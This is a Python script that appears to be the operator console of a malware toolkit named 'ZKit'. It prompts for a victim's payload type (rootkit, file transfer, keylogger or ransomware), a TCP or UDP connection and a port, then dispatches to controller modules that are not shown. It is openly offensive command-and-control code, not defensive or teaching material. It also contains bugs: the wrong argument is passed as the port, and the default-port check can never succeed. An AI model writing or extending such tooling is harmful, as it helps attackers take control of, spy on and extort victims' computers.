"Talks to controllers"

import os
import lib.controllers.rootkit_controller as r_ctrl
import lib.controllers.keylogger_controller as k_ctrl
import lib.controllers.ransomware_controller as ran_ctrl
from ui_core.coloring import Color, notify

if os.name == 'nt':
    from colorama import init  # pylint: disable=C0415; # noqa
    init(convert=True)

conns = {'1': 'TCP', '2': 'UDP'}


class Main:
    "Talks to controllers . gets info from user and lets user have fun"

    def __init__(self):
        self.col = Color().GetColor
        self.red, self.green, self.blue, self.reset = self.col('red'), self.col(
            'green'), self.col("blue"), self.col("reset")

        conn, port, type_ = self.get_info()

        if self.validate((conn, port, type_)):
            self.control(type_, conn, type_)

    @staticmethod
    def _get_type(choice):
        if choice == "1":
            type_ = "rootkit"
        elif choice == "2":
            type_ = "ft"
        elif choice == "3":
            type_ = "keylogger"
        elif choice == "4":
            type_ = "ransomware"
        return type_

    def get_info(self):
        "Gets info from user"

        print("What Is The Victims PayLoad ?\n"
              f"{self.red}{{1}}--> Rootkit\n"
              f"{self.blue}{{2}}--> File Transfer (ft)\n"
              f"{self.green}{{3}}--> KeyLogger\n"
              f"{self.red}{{4}}--> Ransomware\n"
              f"{self.blue}{{000}}--> Back To Main Menu\n" + self.reset)

        choice = str(input("..> "))

        if choice in ("1", "2", "3", "4"):
            print("At The Time Of Creation Of Payload . ZKit Asked About A Connection Type "
                  "What Was It ?\n"
                  + self.red + "{1}--> TCP\n"
                  + self.green + "{2}--> UDP\n" + self.reset)
            conn = str(input("..> "))
            conn = conns[conn]

            notify(
                "question", "what port did you used ? left empty to use default (1534)")
            port = int(input("..> "))
            if port == "-1":
                port = 1534
            type_ = self._get_type(choice)
            return (conn, port, type_)

        notify("notify",
               "Invalid Input {" + "{}".format(choice) + "}")

    def control(self, type_, conn, port):
        if type_ == "keylogger":
            k_ctrl.connect(conn, port)
        elif type_ in ("rootkit", "ft"):
            r_ctrl.connect(conn, port, type_)
        else:
            ran_ctrl.connect(conn, port)

    @ staticmethod
    def validate(payload_tuple: tuple) -> bool:
        "validates data from user"
        conn, port, type_ = payload_tuple
        return conn in ["TCP", "UDP"] and isinstance(port, int) and type_ in ["ft", "rootkit", "keylogger", "ransomware"]
